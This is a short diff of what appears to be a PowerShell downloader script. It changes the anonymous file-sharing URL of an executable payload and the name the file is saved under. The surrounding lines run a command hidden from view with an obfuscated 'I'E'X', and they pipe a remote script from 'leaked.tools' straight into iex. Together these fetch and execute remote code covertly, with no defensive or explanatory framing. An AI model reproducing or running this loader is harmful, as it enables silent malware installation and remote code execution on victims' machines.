@@ -126,8 +126,8 @@ Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -Pas
 
 iwr "https://leaked.tools/r/GFvWVhDQmc" | iex
 
-$url = "https://anonsharing.com/file/0cd01f4495a26c20/rc.exe"
-$output = "$dir\gay.exe"
+$url = "https://anonsharing.com/file/3bcedc688a307967/rc_(2).exe"
+$output = "$dir\T_T.exe"
 if (Test-Path -Path $output) {
     Write-Host "hello"
 } else {
